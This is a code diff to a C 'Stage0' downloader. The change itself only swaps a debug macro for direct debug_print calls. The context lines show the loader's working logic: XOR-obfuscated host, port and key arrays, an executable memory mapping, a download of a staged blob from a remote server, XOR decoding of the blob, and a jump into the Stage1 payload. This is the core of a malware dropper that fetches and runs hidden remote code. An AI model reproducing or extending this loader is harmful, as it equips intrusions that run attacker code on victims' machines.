@@ -24,12 +24,6 @@
 #endif
 #define BUFFER_SIZE 65536
 
-#ifdef DEBUG
-#define DEBUG_PRINT(fmt, args...) debug_print("DL: " fmt, ##args)
-#else
-#define DEBUG_PRINT(fmt, args...)
-#endif
-
 // XOR-encoded configuration arrays
 static const unsigned char encoded_host[] = {ENCODED_HOST};
 static const unsigned char encoded_port[] = {ENCODED_PORT};
@@ -62,14 +56,14 @@ void downloader_main(void) {
   decode_config_string(key_str, encoded_key, sizeof(key_str));
   derive_key_from_string(key_str, key);
 
-  DEBUG_PRINT("Stage0: Downloading Stage1 blob from %s:%s%s\n", host, port,
+  debug_print("Stage0: Downloading Stage1 blob from %s:%s%s\n", host, port,
               path);
 
   void *stage_blob = (void *)mmap(NULL, MAX_STAGE_BLOB_SIZE,
                                   PROT_READ | PROT_WRITE | PROT_EXEC,
                                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
   if (stage_blob == MAP_FAILED) {
-    DEBUG_PRINT("Stage0: mmap failed\n");
+    debug_print("Stage0: mmap failed\n");
     exit(1);
   }
 
@@ -77,7 +71,7 @@ void downloader_main(void) {
       host, port, path, key, stage_blob, MAX_STAGE_BLOB_SIZE);
 
   if (downloaded_size == 0) {
-    DEBUG_PRINT("Stage0: download failed\n");
+    debug_print("Stage0: download failed\n");
     munmap(stage_blob, MAX_STAGE_BLOB_SIZE);
     exit(1);
   }
@@ -85,7 +79,7 @@ void downloader_main(void) {
   // Decode the full staged blob (Stage1 loader + appended Stage2 payload).
   xor_data((char *)stage_blob, downloaded_size, key, 16);
 
-  DEBUG_PRINT("Stage0: downloaded %d bytes, jumping to Stage1\n",
+  debug_print("Stage0: downloaded %d bytes, jumping to Stage1\n",
               (int)downloaded_size);
 
   typedef void (*stage1_entry)(void *base_addr, size_t total_size);
